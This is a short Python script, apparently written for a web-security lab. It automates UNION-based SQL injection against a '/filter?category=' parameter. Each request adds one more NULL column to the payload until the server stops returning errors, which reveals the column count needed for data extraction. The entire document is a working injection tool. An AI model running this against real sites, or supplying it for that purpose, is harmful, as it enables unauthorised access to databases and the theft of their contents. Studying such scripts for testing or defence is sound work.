import requests
import sys

def check_server_response(url):
    response = requests.get(url)
    return response.status_code

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    base_url = sys.argv[1] + "/filter?category=' UNION SELECT NULL"
    nulls = "NULL"
    headers = {}

    while True:
        url = base_url + ", " + nulls + " -- -"
        status_code = check_server_response(url)

        if status_code != 500:
            print(f"Server response is {status_code} with URL: {url}")
            break

        nulls += ", NULL"

